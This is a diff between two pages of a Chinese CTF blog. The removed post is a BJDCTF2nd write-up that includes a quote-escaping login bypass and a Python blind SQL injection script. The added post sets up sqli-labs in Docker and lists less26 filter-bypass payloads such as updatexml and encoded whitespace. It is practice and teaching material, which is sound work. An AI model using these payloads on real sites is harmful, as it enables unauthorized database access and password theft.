@@ -6,26 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>BJDCTF2nd 简单注入 | Xun9er&#39;s blog</title>
+  <title>notes on sqli-labs | Xun9er&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="burp fuzz学到了，，俺再也不要手工测过滤了QAQ。利用 Burpsuite Fuzz 实现 SQL 注入   robots.txt提示提示有hint.txt访问如下：  Only u input the correct password then u can get the flag and p3rh4ps wants a girl friend.  select * from users">
-<meta name="keywords" content="随笔,ctf,sqli">
+  <meta name="description" content="把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以借此新开一篇。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BJDCTF2nd 简单注入">
-<meta property="og:url" content="http://yoursite.com/2020/03/25/BJDCTF2nd-简单注入/index.html">
+<meta property="og:title" content="notes on sqli-labs">
+<meta property="og:url" content="http://yoursite.com/2020/03/26/notes-on-sqli-labs/index.html">
 <meta property="og:site_name" content="Xun9er&#39;s blog">
-<meta property="og:description" content="burp fuzz学到了，，俺再也不要手工测过滤了QAQ。利用 Burpsuite Fuzz 实现 SQL 注入   robots.txt提示提示有hint.txt访问如下：  Only u input the correct password then u can get the flag and p3rh4ps wants a girl friend.  select * from users">
+<meta property="og:description" content="把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以借此新开一篇。">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://i.loli.net/2020/03/25/v6znuLWyc3Bm2Nj.png">
-<meta property="og:image" content="https://i.loli.net/2020/03/25/PvNYdcqfLxoh9SB.png">
-<meta property="og:image" content="https://i.loli.net/2020/03/25/QnZT3aHcMX1SKWt.png">
-<meta property="og:image" content="https://i.loli.net/2020/03/25/5YMSP1hZqxFutsb.png">
-<meta property="og:image" content="https://i.loli.net/2020/03/25/FAMSKQ35qgBewYN.png">
-<meta property="og:updated_time" content="2020-03-25T09:05:42.670Z">
+<meta property="og:updated_time" content="2020-03-26T01:40:52.108Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="BJDCTF2nd 简单注入">
-<meta name="twitter:description" content="burp fuzz学到了，，俺再也不要手工测过滤了QAQ。利用 Burpsuite Fuzz 实现 SQL 注入   robots.txt提示提示有hint.txt访问如下：  Only u input the correct password then u can get the flag and p3rh4ps wants a girl friend.  select * from users">
-<meta name="twitter:image" content="https://i.loli.net/2020/03/25/v6znuLWyc3Bm2Nj.png">
+<meta name="twitter:title" content="notes on sqli-labs">
+<meta name="twitter:description" content="把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以借此新开一篇。">
   
     <link rel="alternative" href="/atom.xml" title="Xun9er&#39;s blog" type="application/atom+xml">
   
@@ -176,20 +169,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-BJDCTF2nd-简单注入" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-notes-on-sqli-labs" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      BJDCTF2nd 简单注入
+      notes on sqli-labs
     </h1>
   
 
         
-        <a href="/2020/03/25/BJDCTF2nd-简单注入/" class="archive-article-date">
-  	<time datetime="2020-03-25T07:26:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-25</time>
+        <a href="/2020/03/26/notes-on-sqli-labs/" class="archive-article-date">
+  	<time datetime="2020-03-26T09:10:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-26</time>
 </a>
     <!--字数统计-->
         
@@ -198,7 +191,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">432字</span>
+        <span class="post-count">390字</span>
       </span>
     </span>
 
@@ -207,7 +200,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">2分</span>
+        <span class="post-count">1分</span>
       </span>
     </span>
 </div>
@@ -218,21 +211,33 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="burp-fuzz"><a href="#burp-fuzz" class="headerlink" title="burp fuzz"></a>burp fuzz</h1><p>学到了，，俺再也不要手工测过滤了QAQ。<a href="https://segmentfault.com/a/1190000018748071" target="_blank" rel="noopener">利用 Burpsuite Fuzz 实现 SQL 注入</a><br><img src="https://i.loli.net/2020/03/25/v6znuLWyc3Bm2Nj.png" alt="sqli 3.png"><br><img src="https://i.loli.net/2020/03/25/PvNYdcqfLxoh9SB.png" alt="sqli 4.png">  </p>
-<h1 id="robots-txt提示"><a href="#robots-txt提示" class="headerlink" title="robots.txt提示"></a>robots.txt提示</h1><p>提示有hint.txt<br>访问如下：</p>
-<pre>
-Only u input the correct password then u can get the flag
-and p3rh4ps wants a girl friend.
+        <p><em>把sqli-lab移到linux docker里了，前面那篇笔记太长了，看着烦，所以借此新开一篇。</em> </p>
+<a id="more"></a>
+<h1 id="docker搭建sqli-labs"><a href="#docker搭建sqli-labs" class="headerlink" title="docker搭建sqli-labs"></a>docker搭建sqli-labs</h1><p>1、docker search sqli-lab 查找sqli-labs 镜像</p>
+<p>2、docker pull acgpiano/sqli-labs 拉取镜像到本地</p>
+<p>3、docker images 查看已有的镜像</p>
+<p>4、docker run -dt –name sqli -p 80:80 –rm acgpiano/sqli-labs</p>
+<p>-dt 让其在后台运行<br>–name 给其命名<br>-p 本地端口：docker中的端口 是将docker的端口映射到本地端口<br>–rm 当其关闭后将删除开启的资源</p>
+<h1 id="less26"><a href="#less26" class="headerlink" title="less26"></a>less26</h1><p>首先判断闭合。<br>单引号报错，双引号不报。–&gt;单引号闭合<br>查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
 
-select * from users where username='$_POST["username"]' and password='$_POST["password"]';
+<p>黑名单：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id= preg_replace(&apos;/or/i&apos;,&quot;&quot;, $id);			//strip out OR (non case sensitive)</span><br><span class="line">	$id= preg_replace(&apos;/and/i&apos;,&quot;&quot;, $id);		//Strip out AND (non case sensitive)</span><br><span class="line">	$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">	$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);		//Strip out --</span><br><span class="line">	$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);			//Strip out #</span><br><span class="line">	$id= preg_replace(&apos;/[\s]/&apos;,&quot;&quot;, $id);		//Strip out spaces</span><br><span class="line">	$id= preg_replace(&apos;/[\/\\\\]/&apos;,&quot;&quot;, $id);		//Strip out slashes</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-//鍑洪浜哄洓绾у帇绾挎墠杩� 瑙佽皡瑙佽皡 棰嗕細绮剧
-</pre>
-<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>后来从分享会上知道了可以用\来转义username后面的单引号。<br><img src="https://i.loli.net/2020/03/25/QnZT3aHcMX1SKWt.png" alt="sqli1.png"><br>payload：<code>username=admin\&amp;password=&#39;or 1#</code><br>带入得：<code>select * from users where username=&#39;admin\&#39; and password=&#39;&#39;or 1#&#39;</code>  </p>
-<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><p>已知为1时返回页面有：“you know …..girlfriend”,为0时返回“BDJ needs to be stronger”。<br>所以把这里的1换成判断语句就可以开始盲注了,又把之前的拿来改改：<br>这里传\的时候最开始不知道怎么传上去，因为它直接转义了后面的内容噗，后来从师傅们那里知道了要用俩，python会自动转义一次。  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://bad6a7d7-7c67-4b08-8083-fbda7d88b93e.node3.buuoj.cn&quot;</span><br><span class="line"></span><br><span class="line">flag=&apos;&apos;#定义一个空字符串</span><br><span class="line"></span><br><span class="line">for i in range(1,20):	</span><br><span class="line">	low=32</span><br><span class="line">	high=126</span><br><span class="line">	mid=(low+high)//2## 二分法</span><br><span class="line">	while high&gt;low:</span><br><span class="line">		</span><br><span class="line">		#payload=&apos;or ascii(substr((database()),&#123;&#125;,1))&gt;&#123;&#125;#&apos;.format(i,mid)</span><br><span class="line">		payload=&apos;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;#&apos;.format(i,mid)</span><br><span class="line">		data=&#123;</span><br><span class="line">			&apos;username&apos;:&apos;admin \\&apos;,</span><br><span class="line">			&apos;password&apos;:payload</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		r=requests.post(url,data=data)	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">		if &apos;stronger&apos; in r.text:</span><br><span class="line">			low = mid+1</span><br><span class="line">			mid=(low+high)//2</span><br><span class="line">		else:</span><br><span class="line">			high=mid	</span><br><span class="line">			mid=(low+high)//2</span><br><span class="line">	flag+=chr(mid)#将ascii值转为字符</span><br><span class="line">	print(flag)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
-
-<p>ps：这里直接爆password就可以了，不用头铁去爆库爆表。。。database查出来了，但表名就查不了，至少我没查出来。<br><img src="https://i.loli.net/2020/03/25/5YMSP1hZqxFutsb.png" alt="bjd sql1.png"><br>得到密码，登录。<br><img src="https://i.loli.net/2020/03/25/FAMSKQ35qgBewYN.png" alt="bjd sql2.png">  </p>
+<p>两种方法：  </p>
+<ul>
+<li>用()代替空格  </li>
+<li>用其他编码代替空格（linux下）  </li>
+</ul>
+<p>()bypass：<br><code>?id=1&#39;||updatexml(1,(concat(&#39;:&#39;,database())),1)||&#39;1&#39;=&#39;1</code><br><code>?id=1&#39;||updatexml(1,concat(&#39;~&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),1)||&#39;1&#39;=&#39;1</code><br>编码bypass：  </p>
+<ul>
+<li>%09 TAB键（水平）</li>
+<li>%0a 新建一行</li>
+<li>%0c 新的一页</li>
+<li>%0d return功能</li>
+<li>%0b TAB键（垂直）</li>
+<li>%a0 空格<br><code>?id=0%27%a0union%a0select%a01,database(),2||%271%27=%271</code><br>报表名用&amp;的编码（%26）来替换||：<br><code>?id=0%27union%a0select%a01,group_concat(table_name),3%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%a0%271%27=%271</code></li>
+</ul>
 
       
 
@@ -262,25 +267,6 @@ select * from users where username='$_POST["username"]' and password='$_POST["pa
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">sqli</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
@@ -331,7 +317,7 @@ select * from users where username='$_POST["username"]' and password='$_POST["pa
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/03/25/BJDCTF2nd-简单注入/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/03/26/notes-on-sqli-labs/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -346,8 +332,8 @@ select * from users where username='$_POST["username"]' and password='$_POST["pa
 <nav id="article-nav">
   
   
-    <a href="/2020/03/22/notes-on-checkio/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">notes on checkio</div>
+    <a href="/2020/03/25/BJDCTF2nd/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">BJDCTF2nd</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -374,7 +360,7 @@ select * from users where username='$_POST["username"]' and password='$_POST["pa
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#burp-fuzz"><span class="toc-number">1.</span> <span class="toc-text">burp fuzz</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#robots-txt提示"><span class="toc-number">2.</span> <span class="toc-text">robots.txt提示</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bypass"><span class="toc-number">3.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#脚本"><span class="toc-number">4.</span> <span class="toc-text">脚本</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#docker搭建sqli-labs"><span class="toc-number">1.</span> <span class="toc-text">docker搭建sqli-labs</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#less26"><span class="toc-number">2.</span> <span class="toc-text">less26</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -486,15 +472,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">sqli</a>
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -502,7 +480,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">php</a>
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -523,6 +501,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">sqli</a>
               </li>
             
             <div class="clearfix"></div>
